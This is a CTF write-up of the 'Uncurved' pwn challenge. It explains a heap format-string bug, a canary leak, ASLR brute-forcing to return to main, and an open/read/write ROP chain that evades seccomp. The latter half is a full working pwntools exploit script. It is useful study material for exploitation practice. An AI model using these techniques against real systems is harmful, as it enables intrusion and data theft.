### **Uncurved**

was a pwn challenge from DigitalOverdose 2021 CTF,

it is a remake from "Curve" a pwn challenge from PBJarCTF 2021, written by Rythm.

basically, it is a format string on heap, with a seccomp to forbid execve onegadgets...

I did not participate to DigitalOverdose CTF because I wasn't there, I did it after the the CTF ends, just to practice..

Here is my solution so..

**let's check first the protections of the binary:**

![](https://github.com/nobodyisnobody/write-ups/raw/main/DigitalOverdose.2021/pwn/uncurved/pics/checksec.png)

**and let's check also the seccomp in place:**

![](https://github.com/nobodyisnobody/write-ups/raw/main/DigitalOverdose.2021/pwn/uncurved/pics/seccomp.png)

As you can see, only open, read, write, are usefull for us...the rest is forbidden..

**let's reverse the program to see the vuln:**

![](https://github.com/nobodyisnobody/write-ups/raw/main/DigitalOverdose.2021/pwn/uncurved/pics/reverse.png)

Unlike the original "Curve" challenge, the first input from user, at 'Input 1:',  is zero terminated this time,

and the buffer s[] on stack is filled with zeroes, so we can not leak an address on stack like in "Curve"

There is still a big buffer overflow, in the "Input 1" , but as there is a canary in place, we can not use it directly..

The last "Input 3:" , is directly passed to printf(),  so there is a format string vulnerability here as in the original challenge.

So our strategy will be to first try to do a ret2main, with the format string vulnerability, and to leak the canary at the same time...

then when the ret2main will succeed, we can simply do a open/read/write ROP, to dump the flag with the "Input 1" buffer overflow,

as we will know the canary value at this time..

to do the ret2main, we will use a classic strategy for format string on heap...

**let's examine the stack state just before the last printf() where the format string vuln is:**

![](https://github.com/nobodyisnobody/write-ups/raw/main/DigitalOverdose.2021/pwn/uncurved/pics/stack.png)

In red, you can see on the picture above, the _libc_start_main+234,  where the program will return after main() function.

it is at format string pos 27,  and just after it at pos 28, there is a pointer to &argv[0] on stack (which is at pos 57)

so we will use a format string to write to pos57 two last lsb bytes, with the pointer 28

and we will bruteforce the 12bits of ASLR, to make pointer 57 points on stack pos 27 (the return address)

then we will write 0x03 byte to return address to return at _libc_start_main+227,

that will call main again.. a ret2main so...

as always with format string you can not access stack positions with positional notation, because at the moment you use positionnal notation, 

the printf function will take a snapshot of the stack state, and any modifications you will made , will not be taken into account... 

so you have, to progress in stack pointers position using %c to pass to next position...

then when you have modified the stack as you want.. you can use positionnal position..(at the end of the format string in general)


but you have to increase pos, one by one with '%c'..

the bruteforce will not take too much time, depending on your connection speed, server responsiveness, and luck... (minutes probably, less than an hour for sure..)

at the end of our format string, we will add '%25$p' to leak canary value that is at pos 25.

When the ret2main will succeed, we will receive again the 'Input 1:' string...with the canary value..

next part is just a classic ROP...

**here is a successfull session for example:**

![](https://github.com/nobodyisnobody/write-ups/raw/main/DigitalOverdose.2021/pwn/uncurved/pics/gotflag.png)


**and here is the code of the exploit:**

```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'

exe = ELF('./uncurved')
libc = ELF('./libc.so.6')
r = ROP(exe)

host, port = "193.57.159.27", "46219"

count=0
# we are trying a ret2main, and a leak of canary at the same time
# bruteforce 12bits of ASLR , 1/4096 chance to success.. 
# server answers quick but could take time depending on luck
#
print('ASLR bruteforce starts...')
while (count<10000):
  print(str(count))
  if args.REMOTE:
    p = remote(host,port)
  else:
    p = process(exe.path)

  offset = 1
  p.sendafter('Input 1:\n', 'a'*(offset*8))
  p.sendafter('Input 2:\n', 'a'*(offset*8))

  payload = '%c'*26+'%5758c'+'%hn'+'%c'*27+'%80c'+'%hhn'+'%25$p'
  p.sendafter('Input 3:\n', payload)
  try:
    buff=p.recvuntil('Input 1:\n', timeout=3)
    break
  except:
    p.close()
    count += 1

# get our canary leak
print(buff)
off = buff.find('0x')
canary = int(buff[off:off+18],16)
print('canary = '+hex(canary))

payload = 'A'*0x88+p64(canary)+p64(0xdeadbeef)

# ret2csu gadgets
set_csu = next(exe.search(asm('pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret'), executable = True))
call_csu = next(exe.search(asm('mov rdx, r14; mov rsi, r13; mov edi, r12d')))
def do_ret2csu(edi=0,rsi=0,rdx=0, func=0, rbx=0,rbp=0,r12=0,r13=0,r14=0,r15=0):
   global set_csu
   global call_csu
   return p64(set_csu)+p64(0)+p64(1)+p64(edi)+p64(rsi)+p64(rdx)+p64(func)+p64(call_csu)+p64(0)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)


buff = exe.bss(0xa00)	# a buffer in bss

# 1st ROP payload -->  leak puts libc address & read second ROP payload in bss & pivot to it
r.puts(exe.got['puts'])
r.raw(do_ret2csu(0,buff,0x100,func=exe.got['read']))
r.migrate(buff+24)
p.send(payload+r.chain())

p.sendafter('Input 2:\n', 'a')
p.sendafter('Input 3:\n', 'ab')

# get our libc leak & calculate libc base
p.recvuntil('Rythm.\n', drop=True)
libc.address = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - libc.symbols['puts']
print('libc base = '+hex(libc.address))

# second ROP payload open flag.txt / read it / dump it
if args.REMOTE:
  payload2 = '/srv/app/flag.txt'.ljust(24,'\x00')
else:
  payload2 = './flag.txt'.ljust(24,'\x00')
rop2 = ROP(libc)
syscall = rop2.find_gadget(['syscall', 'ret'])[0]
xchg_eax_edi = libc.address + 0x000000000012a03c # xchg eax, edi ; ret
rop2(rax=2)
rop2.call(syscall,[buff,0,0])
rop2.raw(p64(xchg_eax_edi))
rop2(rsi=0x404100,rdx=0x100)
rop2.call(exe.symbols['read'])
rop2.call(exe.symbols['puts'], [0x404100])
p.send(payload2+rop2.chain())

p.interactive()
```

*nobodyisnobody still pwning things...*

